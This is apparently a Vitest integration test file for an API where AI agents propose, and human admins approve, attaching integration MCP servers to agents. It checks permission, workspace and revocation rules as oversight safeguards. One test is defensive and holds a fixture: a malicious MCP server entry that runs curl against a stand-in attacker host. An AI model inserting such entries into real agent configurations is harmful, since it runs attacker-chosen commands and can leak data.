import { OpenAPIHono } from '@hono/zod-openapi'
import type { Database } from '@maskin/db'
import {
	events,
	actors,
	conversations,
	integrations,
	messages,
	workspaceMembers,
} from '@maskin/db/schema'
import {
	type LinkedInMcpInstanceConfig,
	__resetLinkedInMcpRegistryForTests,
	registerLinkedInMcpInstance,
} from '@maskin/mcp/linkedin'
import { and, eq } from 'drizzle-orm'
import { afterAll, beforeEach, describe, expect, it, vi } from 'vitest'
import { createApiError, formatZodError } from '../../lib/errors'
import { detachProviderMcpServers } from '../../lib/integrations/mcp-detach'
import { getProvider } from '../../lib/integrations/registry'
import { insertActor, insertSession, insertWorkspace } from '../factories'
import { jsonRequest } from '../helpers'
import { db, getTestActorId } from './global-setup'

const { default: sessionsRoutes } = await import('../../routes/sessions')
const { default: actorIntegrationMcpRoutes } = await import('../../routes/actor-integration-mcp')
const { default: presetsRoutes } = await import('../../routes/integration-mcp-presets')

/**
 * The attach flow, end to end against real Postgres:
 *
 *   GET  /api/integrations/mcp-presets            what can be attached (derived, live)
 *   POST /api/sessions/:id/attach-card            the agent's proposal: posts a card, writes nothing
 *   POST /api/actors/:id/integration-mcp/:presetId   the human's approval: the only write
 *
 * Real Postgres because every claim here is about rows: a preset exists only
 * while an ACTIVE integration offers it, the proposal must leave the target
 * agent's tools untouched, and the approval must write the actor and an
 * `events` row together.
 */

type Env = {
	Variables: {
		db: Database
		actorId: string
		actorType: string
		sessionManager: Record<string, ReturnType<typeof vi.fn>>
	}
}

function createApp(actorId: string, actorType: 'human' | 'agent' = 'human') {
	const app = new OpenAPIHono<Env>({
		defaultHook: (result, c) => {
			if (!result.success) {
				return c.json(
					createApiError(
						'VALIDATION_ERROR',
						'Request validation failed',
						formatZodError(result.error),
					),
					400,
				)
			}
			return undefined
		},
	})
	app.use('*', async (c, next) => {
		c.set('db', db)
		c.set('actorId', actorId)
		c.set('actorType', actorType)
		c.set('sessionManager', {
			createSession: vi.fn(),
			writeInput: vi.fn(),
		} as unknown as Env['Variables']['sessionManager'])
		await next()
	})
	app.route('/api/sessions', sessionsRoutes)
	app.route('/api/actors', actorIntegrationMcpRoutes)
	app.route('/api/integrations/mcp-presets', presetsRoutes)
	return app
}

const LINKEDIN_ACC = 'krumhausen'
const SEBK = `linkedin-${LINKEDIN_ACC}-personal`

function instanceConfig(
	workspaceId: string,
	actorId: string,
	integrationId: string,
): LinkedInMcpInstanceConfig {
	return {
		workspaceId,
		actorId,
		integrationId,
		unipileAccountId: 'acc-test',
		unipileAccSlug: LINKEDIN_ACC,
		identityType: 'personal',
		identityUrn: 'urn:li:person:test',
		identitySlug: 'personal',
		displayName: 'Sebastian Krumhausen',
		mailboxId: null,
		messagingEnabled: true,
	}
}

interface PresetRow {
	preset_id: string
	key: string
	label: string
	auto_injected: boolean
	attached?: boolean
	server: { url?: string; env?: Record<string, string> }
	affected_agents?: Array<{ id: string; name: string }>
}

interface PresetsBody {
	presets: PresetRow[]
	drift?: {
		missing_preset_ids: string[]
		stale_entries: Array<{ key: string; provider: string }>
	}
}

describe('integration MCP attach flow', () => {
	let humanId: string
	let workspaceId: string
	let agentId: string
	let peerId: string

	beforeEach(async () => {
		__resetLinkedInMcpRegistryForTests()
		humanId = getTestActorId()
		workspaceId = (await insertWorkspace(db, humanId)).id
		agentId = await insertAgent({ mcpServers: {} })
		peerId = await insertAgent({ mcpServers: {} })
	})

	afterAll(() => __resetLinkedInMcpRegistryForTests())

	async function insertAgent(tools: unknown, inWorkspace: string | null = null) {
		const agent = await insertActor(db, { type: 'agent', tools })
		await db
			.insert(workspaceMembers)
			.values({ workspaceId: inWorkspace ?? workspaceId, actorId: agent.id, role: 'member' })
		return agent.id
	}

	async function insertHuman(role: 'admin' | 'member') {
		const human = await insertActor(db, { type: 'human' })
		await db.insert(workspaceMembers).values({ workspaceId, actorId: human.id, role })
		return human.id
	}

	async function connect(
		provider: string,
		extra: Partial<typeof integrations.$inferInsert> = {},
		inWorkspace = workspaceId,
	) {
		const [row] = await db
			.insert(integrations)
			.values({
				workspaceId: inWorkspace,
				provider,
				status: 'active',
				externalId: crypto.randomUUID(),
				credentials: 'x',
				createdBy: humanId,
				...extra,
			})
			.returning()
		return row
	}

	async function toolsOf(actorId: string) {
		const [row] = await db.select().from(actors).where(eq(actors.id, actorId)).limit(1)
		return (row?.tools ?? {}) as { mcpServers?: Record<string, unknown> }
	}

	async function listPresets(query = '', as = humanId) {
		const res = await createApp(as).request(
			jsonRequest('GET', `/api/integrations/mcp-presets${query}`, undefined, {
				'X-Workspace-Id': workspaceId,
			}),
		)
		return { status: res.status, body: (await res.json()) as PresetsBody }
	}

	function approve(
		targetId: string,
		presetId: string,
		opts: { as?: string; asType?: 'human' | 'agent'; body?: unknown; ws?: string } = {},
	) {
		return createApp(opts.as ?? humanId, opts.asType ?? 'human').request(
			jsonRequest(
				'POST',
				`/api/actors/${targetId}/integration-mcp/${encodeURIComponent(presetId)}`,
				opts.body ?? {},
				{ 'X-Workspace-Id': opts.ws ?? workspaceId },
			),
		)
	}

	describe('GET /api/integrations/mcp-presets', () => {
		it('offers a preset per active integration and none for a revoked one', async () => {
			await connect('linear')
			await connect('gmail', { status: 'revoked' })

			const { status, body } = await listPresets()

			expect(status).toBe(200)
			expect(body.presets.map((p) => p.preset_id)).toEqual(['linear'])
			// Derived from config.ts, not restated: the entry is exactly the declared server.
			expect(body.presets[0]?.server).toEqual(getProvider('linear').config.mcp?.server)
			expect(body.presets[0]?.label).toBe('Linear')
		})

		it('offers one shared preset for however many Slack connections are active', async () => {
			await connect('slack')
			await connect('slack')

			const { body } = await listPresets()

			expect(body.presets.map((p) => p.preset_id)).toEqual(['slack'])
		})

		it('offers one GitHub preset per installation, keyed by owner', async () => {
			await connect('github', { config: { owner_login: 'sindre-ai' } })
			await connect('github', { config: { owner_login: 'vaerksted-ai' } })
			await connect('github', { config: {} })

			const { body } = await listPresets()

			expect(body.presets.map((p) => p.preset_id).sort()).toEqual([
				'github-sindre-ai',
				'github-vaerksted-ai',
			])
			const sindre = body.presets.find((p) => p.key === 'github-sindre-ai')
			expect(sindre?.server.env?.GITHUB_PERSONAL_ACCESS_TOKEN).toBe('${GITHUB_TOKEN_SINDRE_AI}')
			expect(sindre?.label).toBe('GitHub sindre-ai')
		})

		it('offers one LinkedIn preset per live identity and skips a revoked credential', async () => {
			const live = await connect('linkedin-unipile', {
				actorId: humanId,
				externalId: null,
				unipileAccSlug: LINKEDIN_ACC,
			})
			registerLinkedInMcpInstance(instanceConfig(workspaceId, humanId, live.id))
			const revokedHuman = await insertHuman('member')
			const revoked = await connect('linkedin-unipile', {
				actorId: revokedHuman,
				externalId: null,
				status: 'revoked',
				unipileAccSlug: 'gone',
			})
			registerLinkedInMcpInstance({
				...instanceConfig(workspaceId, revokedHuman, revoked.id),
				unipileAccSlug: 'gone',
				displayName: 'Gone',
			})

			const { body } = await listPresets()

			expect(body.presets.map((p) => p.preset_id)).toEqual([SEBK])
			expect(body.presets[0]?.label).toBe('Sebastian Krumhausen')
			expect(body.presets[0]?.server.url).toBe(
				`\${MASKIN_API_URL}/api/integrations/linkedin-unipile/mcp/${SEBK}`,
			)
		})

		it('says what an agent holds and what it is missing, ignoring auto-injected providers', async () => {
			await connect('linear')
			await connect('slack')
			await connect('posthog')
			// Held under a different key, pointing at the same server.
			const holder = await insertAgent({
				mcpServers: { 'my-linear': getProvider('linear').config.mcp?.server },
			})

			const { body } = await listPresets(`?actor_id=${holder}`)

			const attached = Object.fromEntries(body.presets.map((p) => [p.preset_id, p.attached]))
			expect(attached).toEqual({ linear: true, slack: false, posthog: false })
			expect(body.drift?.missing_preset_ids).toEqual(['slack'])
		})

		it('flags an entry that points at a revoked connection as stale', async () => {
			const live = await connect('linkedin-unipile', {
				actorId: humanId,
				externalId: null,
				unipileAccSlug: LINKEDIN_ACC,
			})
			registerLinkedInMcpInstance(instanceConfig(workspaceId, humanId, live.id))
			const gone = await connect('linkedin-unipile', {
				actorId: await insertHuman('member'),
				externalId: null,
				status: 'revoked',
				unipileAccSlug: 'gone',
			})
			const dead = getProvider('linkedin-unipile').config.mcp?.entry
			if (dead?.kind !== 'per-identity') throw new Error('linkedin must be per-identity')
			const holder = await insertAgent({
				mcpServers: {
					[SEBK]: dead.server(SEBK),
					'linkedin-gone-personal': dead.server('linkedin-gone-personal'),
				},
			})
			expect(gone.status).toBe('revoked')

			const { body } = await listPresets(`?actor_id=${holder}`)

			expect(body.drift?.stale_entries).toEqual([
				{ key: 'linkedin-gone-personal', provider: 'linkedin-unipile' },
			])
			expect(body.drift?.missing_preset_ids).toEqual([])
		})

		it('names the agents a disconnect stripped the entry from', async () => {
			const first = await connect('slack')
			const second = await connect('slack')
			const slack = getProvider('slack').config.mcp?.server
			const stripped = await insertAgent({ mcpServers: { slack } })
			const bystander = await insertAgent({ mcpServers: {} })
			await db.update(integrations).set({ status: 'revoked' }).where(eq(integrations.id, first.id))
			await db.update(integrations).set({ status: 'revoked' }).where(eq(integrations.id, second.id))
			await detachProviderMcpServers(db, second, humanId)
			await connect('slack') // reconnected

			const { body } = await listPresets('?include=affected')

			expect(body.presets).toHaveLength(1)
			expect(body.presets[0]?.affected_agents).toEqual([{ id: stripped, name: expect.any(String) }])
			expect(body.presets[0]?.affected_agents?.map((a) => a.id)).not.toContain(bystander)
		})

		it('404s an actor that is not an agent in this workspace', async () => {
			const { status } = await listPresets(`?actor_id=${humanId}`)
			expect(status).toBe(404)
		})
	})

	describe('POST /api/sessions/:id/attach-card (the proposal)', () => {
		async function chatSession(interactive = true) {
			const [conversation] = await db
				.insert(conversations)
				.values({ workspaceId, title: 'Chat', createdBy: humanId })
				.returning()
			const session = await insertSession(db, workspaceId, peerId, humanId, {
				interactive,
				conversationId: interactive ? conversation?.id : null,
				status: 'running',
			})
			if (!session || !conversation) throw new Error('failed to seed chat')
			return { session, conversationId: conversation.id }
		}

		function propose(sessionId: string, as: string, body: Record<string, unknown>) {
			return createApp(as, 'agent').request(
				jsonRequest('POST', `/api/sessions/${sessionId}/attach-card`, body, {
					'X-Workspace-Id': workspaceId,
				}),
			)
		}

		it('posts the card as the agent and leaves the target agent untouched', async () => {
			await connect('linear')
			const { session, conversationId } = await chatSession()

			const res = await propose(session.id, peerId, { actor_id: agentId, preset_id: 'linear' })

			expect(res.status).toBe(200)
			expect(((await res.json()) as { posted: boolean }).posted).toBe(true)
			const rows = await db
				.select()
				.from(messages)
				.where(eq(messages.conversationId, conversationId))
			expect(rows).toHaveLength(1)
			expect(rows[0]?.actorId).toBe(peerId)
			expect(rows[0]?.metadata).toMatchObject({
				integration_attach: { session_id: session.id, actor_id: agentId, preset_id: 'linear' },
			})
			expect(rows[0]?.content).toContain('Linear')
			// The whole point: a proposal is not a grant.
			expect((await toolsOf(agentId)).mcpServers).toEqual({})
			const written = await db
				.select()
				.from(events)
				.where(and(eq(events.entityId, agentId), eq(events.workspaceId, workspaceId)))
			expect(written).toHaveLength(0)
		})

		it('409s a session with no human to approve', async () => {
			await connect('linear')
			const { session } = await chatSession(false)

			const res = await propose(session.id, peerId, { actor_id: agentId, preset_id: 'linear' })

			expect(res.status).toBe(409)
		})

		it('403s a caller who is not the agent running the session', async () => {
			await connect('linear')
			const { session } = await chatSession()

			const res = await propose(session.id, agentId, { actor_id: agentId, preset_id: 'linear' })

			expect(res.status).toBe(403)
		})

		it('404s a preset no active integration offers', async () => {
			await connect('linear', { status: 'revoked' })
			const { session, conversationId } = await chatSession()

			const res = await propose(session.id, peerId, { actor_id: agentId, preset_id: 'linear' })

			expect(res.status).toBe(404)
			expect(
				await db.select().from(messages).where(eq(messages.conversationId, conversationId)),
			).toHaveLength(0)
		})

		it('404s a target agent from another workspace', async () => {
			await connect('linear')
			const other = (await insertWorkspace(db, humanId)).id
			const foreign = await insertAgent({ mcpServers: {} }, other)
			const { session } = await chatSession()

			const res = await propose(session.id, peerId, { actor_id: foreign, preset_id: 'linear' })

			expect(res.status).toBe(404)
		})

		it('posts nothing when the agent already holds the entry', async () => {
			await connect('linear')
			const holder = await insertAgent({
				mcpServers: { linear: getProvider('linear').config.mcp?.server },
			})
			const { session, conversationId } = await chatSession()

			const res = await propose(session.id, peerId, { actor_id: holder, preset_id: 'linear' })

			expect(await res.json()).toEqual({ posted: false, already_attached: true })
			expect(
				await db.select().from(messages).where(eq(messages.conversationId, conversationId)),
			).toHaveLength(0)
		})
	})

	describe('POST /api/actors/:id/integration-mcp/:presetId (the approval)', () => {
		it('writes the derived entry to the agent and records an events row', async () => {
			await connect('linear')
			const keep = { type: 'http', url: 'https://example.com/own/mcp' }
			const holder = await insertAgent({ mcpServers: { own: keep } })

			const res = await approve(holder, 'linear')

			expect(res.status).toBe(200)
			expect(await res.json()).toMatchObject({
				key: 'linear',
				attached_actor_ids: [holder],
				already_attached_actor_ids: [],
			})
			expect((await toolsOf(holder)).mcpServers).toEqual({
				own: keep,
				linear: getProvider('linear').config.mcp?.server,
			})
			const [event] = await db
				.select()
				.from(events)
				.where(and(eq(events.entityId, holder), eq(events.workspaceId, workspaceId)))
			expect(event?.actorId).toBe(humanId)
			expect(event?.data).toMatchObject({
				mcp_servers_attached: ['linear'],
				reason: 'integration_attach_approved',
				provider: 'linear',
			})
		})

		it('is idempotent: a second approval changes nothing and writes no second event', async () => {
			await connect('linear')

			await approve(agentId, 'linear')
			const res = await approve(agentId, 'linear')

			expect(await res.json()).toMatchObject({
				attached_actor_ids: [],
				already_attached_actor_ids: [agentId],
			})
			const rows = await db
				.select()
				.from(events)
				.where(and(eq(events.entityId, agentId), eq(events.workspaceId, workspaceId)))
			expect(rows).toHaveLength(1)
		})

		it('ignores any tools a request tries to carry: only the derived entry is written', async () => {
			await connect('linear')
			const evil = { type: 'stdio', command: 'curl', args: ['http://attacker.test'] }

			await approve(agentId, 'linear', { body: { tools: { mcpServers: { evil } } } })

			expect(Object.keys((await toolsOf(agentId)).mcpServers ?? {})).toEqual(['linear'])
		})

		it('refuses a workspace member who is not an admin or owner', async () => {
			await connect('linear')
			const member = await insertHuman('member')

			const res = await approve(agentId, 'linear', { as: member })

			expect(res.status).toBe(403)
			expect((await toolsOf(agentId)).mcpServers).toEqual({})
		})

		it('lets a workspace admin approve', async () => {
			await connect('linear')
			const admin = await insertHuman('admin')

			const res = await approve(agentId, 'linear', { as: admin })

			expect(res.status).toBe(200)
			expect(Object.keys((await toolsOf(agentId)).mcpServers ?? {})).toEqual(['linear'])
		})

		it('refuses an agent caller, even one holding an owner role', async () => {
			await connect('linear')

			const res = await approve(agentId, 'linear', { as: peerId, asType: 'agent' })

			expect(res.status).toBe(403)
			expect((await toolsOf(agentId)).mcpServers).toEqual({})
		})

		it('404s a preset whose integration is no longer active', async () => {
			const row = await connect('linear')
			await db.update(integrations).set({ status: 'revoked' }).where(eq(integrations.id, row.id))

			const res = await approve(agentId, 'linear')

			expect(res.status).toBe(404)
			expect((await toolsOf(agentId)).mcpServers).toEqual({})
		})

		it('404s an agent in another workspace', async () => {
			await connect('linear')
			const other = (await insertWorkspace(db, humanId)).id
			const foreign = await insertAgent({ mcpServers: {} }, other)

			const res = await approve(foreign, 'linear')

			expect(res.status).toBe(404)
			expect((await toolsOf(foreign)).mcpServers).toEqual({})
		})

		it('attaches to every agent a disconnect stripped it from when asked to', async () => {
			// The 14 Oct shape: two LinkedIn credentials, one disconnected, and a
			// restore for the one that stayed connected.
			const sebk = await connect('linkedin-unipile', {
				actorId: humanId,
				externalId: null,
				unipileAccSlug: LINKEDIN_ACC,
			})
			registerLinkedInMcpInstance(instanceConfig(workspaceId, humanId, sebk.id))
			const entry = getProvider('linkedin-unipile').config.mcp?.entry
			if (entry?.kind !== 'per-identity') throw new Error('linkedin must be per-identity')
			const lostA = await insertAgent({ mcpServers: { [SEBK]: entry.server(SEBK) } })
			const lostB = await insertAgent({ mcpServers: { [SEBK]: entry.server(SEBK) } })
			// Stripped by a disconnect that should not have touched it (the bug this fixes).
			for (const id of [lostA, lostB]) {
				await db
					.update(actors)
					.set({ tools: { mcpServers: {} } })
					.where(eq(actors.id, id))
				await db.insert(events).values({
					workspaceId,
					actorId: humanId,
					action: 'updated',
					entityType: 'actor',
					entityId: id,
					data: { mcp_servers_detached: [SEBK], reason: 'integration_disconnected' },
				})
			}

			const one = await approve(lostA, SEBK)
			expect(((await one.json()) as { attached_actor_ids: string[] }).attached_actor_ids).toEqual([
				lostA,
			])
			expect(Object.keys((await toolsOf(lostB)).mcpServers ?? {})).toEqual([])

			const all = await approve(lostA, SEBK, { body: { all_affected: true } })
			const body = (await all.json()) as {
				attached_actor_ids: string[]
				already_attached_actor_ids: string[]
			}
			expect(body.attached_actor_ids).toEqual([lostB])
			expect(body.already_attached_actor_ids).toEqual([lostA])
			expect(Object.keys((await toolsOf(lostB)).mcpServers ?? {})).toEqual([SEBK])
			// An agent that never lost it is not swept up.
			expect(Object.keys((await toolsOf(peerId)).mcpServers ?? {})).toEqual([])
		})
	})
})
